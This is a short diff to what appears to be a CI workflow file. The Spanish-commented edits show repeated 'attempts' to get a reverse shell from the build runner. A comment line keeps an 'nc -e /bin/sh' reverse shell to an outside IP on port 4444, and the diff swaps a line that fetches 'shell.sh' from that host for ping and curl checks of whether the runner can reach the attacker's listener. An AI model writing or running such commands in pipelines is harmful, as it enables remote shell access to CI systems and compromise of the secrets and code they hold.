@@ -55,8 +55,9 @@ jobs:
           # Or with nc: nc -e /bin/sh 200.73.69.220 4444
 
 
-          # INTENTO 8
-          curl http://186.189.75.20:8000/shell.sh
+          # INTENTO 9
+          ping -c 4 186.189.75.20  # ¿Llegan los pings a tu IP?
+          curl -v http://186.189.75.20:4444  # ¿Puede el host conectarse a tu puerto?
 
 
 
